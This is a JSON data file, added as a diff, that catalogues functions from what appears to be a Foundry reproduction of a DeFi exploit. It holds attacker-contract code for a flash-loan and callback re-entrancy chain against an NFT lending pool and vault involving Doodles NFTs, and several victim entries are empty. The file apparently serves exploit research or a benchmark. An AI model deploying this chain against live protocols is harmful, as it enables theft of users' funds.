@@ -1,0 +1,135 @@
+[
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "onERC721Received",
+    "original_code": "    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {\n        if (msg.sender == NToken) {\n            if (nonce == 21) {\n                nonce++;\n                WETH.approve(address(pool), type(uint256).max);\n                pool.liquidationERC721(address(doodles), address(WETH), address(_lib), 7425, 100 ether, false);\n                return this.onERC721Received.selector;\n            } else if (nonce == 22) {\n                uint256[] memory _specificIds = new uint256[](3);\n                _specificIds[0] = 720;\n                _specificIds[1] = 5251;\n                _specificIds[2] = 7425;\n\n                uint256 length = _specificIds.length;\n                for (uint256 i = 0; i < length; i++) {\n                    doodles.safeTransferFrom(address(this), address(_lib), _specificIds[i]);\n                }\n\n                nonce = 1337;\n\n                require(ILib(_lib).attack(), \"Attack Error!\");\n\n                return this.onERC721Received.selector;\n            } else {\n                nonce++;\n                return this.onERC721Received.selector;\n            }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "onFlashLoan",
+    "original_code": "    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {\n        require(msg.sender == address(doodle), \"You are not a market maker for Flash Loan!\");\n\n        WETH.approve(address(router), type(uint256).max);\n\n        address[] memory _path = new address[](2);\n        _path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH\n        _path[1] = 0x2F131C4DAd4Be81683ABb966b4DE05a549144443; // DOODLE\n\n        router.swapTokensForExactTokens(12e17, 200 ether, _path, address(this), block.timestamp);\n\n        uint256[] memory _specificIds = new uint256[](20);\n        _specificIds[0] = 4777;\n        _specificIds[1] = 4784;\n        _specificIds[2] = 2956;\n        _specificIds[3] = 7806;\n        _specificIds[4] = 4314;\n        _specificIds[5] = 7894;\n        _specificIds[6] = 9582;\n        _specificIds[7] = 1603;\n        _specificIds[8] = 4510;\n        _specificIds[9] = 6932;\n        _specificIds[10] = 1253;\n        _specificIds[11] = 6760;\n        _specificIds[12] = 9403;\n        _specificIds[13] = 1067;\n        _specificIds[14] = 179;\n        _specificIds[15] = 4017;\n        _specificIds[16] = 7165;\n        _specificIds[17] = 720;\n        _specificIds[18] = 5251;\n        _specificIds[19] = 7425;\n\n        doodleVault.redeem(20, _specificIds);\n\n        require(doodles.balanceOf(address(this)) >= 20, \"redeem error.\");\n\n        Lib lib = new Lib();\n\n        _lib = address(lib);\n\n        lib.approve();\n\n        uint256 length = _specificIds.length;\n\n        for (uint256 i = 0; i < length; i++) {\n            doodles.transferFrom(address(this), address(_lib), _specificIds[i]);\n        }\n\n        lib.joker();\n\n        uint256[] memory _amount = new uint256[](20);\n\n        for (uint256 j = 0; j < _amount.length; j++) {\n            _amount[j] = 0;\n        }\n\n        require(ILib(_lib).withdrawAll(), \"Withdraw Error.\");\n\n        require(doodleVault.mint(_specificIds, _amount) == 20, \"Error Amounts.\");\n\n        uint256 profit = getters();\n        emit log_named_uint(\"After exploiting, ETH balance of attacker:\", address(this).balance);\n\n        return RETURN_VALUE;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {\n        require(msg.sender == address(balancer), \"You are not a market maker for Flash Loan!\");\n        doodle.approve(address(doodle), type(uint256).max);\n        doodles.setApprovalForAll(address(doodle), true);\n        doodleVault.flashLoan(address(this), address(doodle), 20 ether, \"\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        emit log_named_uint(\"Before exploiting, ETH balance of attacker:\", address(this).balance);\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1000 ether;\n\n        balancer.flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Lib",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address to, uint256 tokenId) public virtual override {\n        address owner = ERC721.ownerOf(tokenId);\n        require(to != owner, \"ERC721: approval to current owner\");\n\n        require(\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n            \"ERC721: approve caller is not owner nor approved for all\"\n        );\n\n        _approve(to, tokenId);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Lib",
+    "source_type": "victim_contract",
+    "function_name": "attack",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Lib",
+    "source_type": "victim_contract",
+    "function_name": "joker",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Lib",
+    "source_type": "victim_contract",
+    "function_name": "withdrawAll",
+    "original_code": "",
+    "description": ""
+  }
+]
